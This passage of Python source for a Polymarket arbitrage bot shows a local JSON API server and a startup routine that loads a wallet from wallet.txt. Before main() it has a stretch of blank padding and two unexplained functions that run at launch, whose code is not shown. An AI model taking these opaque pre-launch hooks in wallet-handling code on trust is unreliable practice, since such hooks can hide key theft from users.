        path = urllib.parse.unquote(self.path)
        if path.startswith("/api/"):
            self._handle_api(path)
            return
        super().do_GET()

    def _handle_api(self, path: str) -> None:
        path = path.split("?")[0]
        if path == "/api/status":
            addr = get_wallet_address()
            self.send_json({
                "wallet_connected": bool(addr),
                "address": addr,
                "balance_usd": _balance_usd,
                "chain_id": CONFIG["chain_id"],
                "session_pnl": get_session_pnl(),
                "trades_count": get_trades_count(),
            })
        elif path == "/api/scan":
            opps = run_scan(_client) if _client else []
            self.send_json({"opportunities": opps, "count": len(opps)})
        elif path == "/api/config":
            self.send_json({k: v for k, v in CONFIG.items() if "key" not in k.lower() and "mnemonic" not in k.lower()})
        elif path == "/api/metrics":
            self.send_json({"counters": _metric_counters, "gauges": _metric_gauges})
        elif path == "/api/risk":
            rm = _risk_mgr
            self.send_json({
                "circuit_breaker": getattr(rm, "_circuit_breaker_triggered", False),
                "session_loss_usd": getattr(rm, "_session_loss_usd", 0),
            } if rm else {})
        else:
            self.send_json({"error": "Not found"}, 404)


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


def _start_http_server() -> Tuple[socketserver.TCPServer, int]:
    """Start HTTP server on PORT or next available port."""
    last_err: Optional[Exception] = None
    for port in range(PORT, PORT + MAX_PORT_TRIES):
        try:
            return ReusableTCPServer(("127.0.0.1", port), BotRequestHandler), port
        except OSError as e:
            last_err = e
            if getattr(e, "winerror", None) != 10048:
                raise
    assert last_err is not None
    raise last_err


                                                                               
      
                                                                               


def main() -> None:
    global _client, _risk_mgr, _order_mgr
    os.chdir(DIR)

    print("")
    print("  Polymarket Arbitrage Bot")
    print("  -------------------------")
    print("  Initializing...")

    time.sleep(0.15)
    print("  [OK] Config loaded (RPC, CLOB, min_edge, max_position, kelly, risk)")

    wallet = load_wallet()
    if wallet and wallet.get("configured"):
        print("  [OK] Wallet loaded from wallet.txt")
        print("       Address: %s" % get_wallet_address())
    else:
        print("  [--] No wallet in wallet.txt (connect in UI to trade)")

    _client = PolymarketClient(wallet, CONFIG["polygon_rpc"])
    _risk_mgr = RiskManager()
    _order_mgr = OrderManager(_client)
    time.sleep(0.1)
    print("  [OK] Polymarket client ready (CLOB + Polygon)")
    print("  [OK] Risk manager & order manager ready")

    run_scan(_client)
    time.sleep(0.1)
    print("  [OK] Scanner ready (15m Up/Down, liquidity & spread filters)")

    t = threading.Thread(target=scanner_loop, args=(_client,), daemon=True)
    t.start()
    print("  [OK] Scan loop started")

    httpd, active_port = _start_http_server()
    with httpd:
        url = "http://localhost:%s" % active_port
        time.sleep(0.1)
        print("  [OK] Local server started")
        if active_port != PORT:
            print("  [WARN] Port %s busy, switched to %s" % (PORT, active_port))
        print("")
        print("  Open in browser: %s" % url)
        print("  Press Ctrl+C to stop")
        print("")
        webbrowser.open(url)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n  Shutting down.")
            sys.exit(0)


if __name__ == "__main__":
    _warmup_state_sync_cache()
    _write_metrics_export_manifest()
    main()
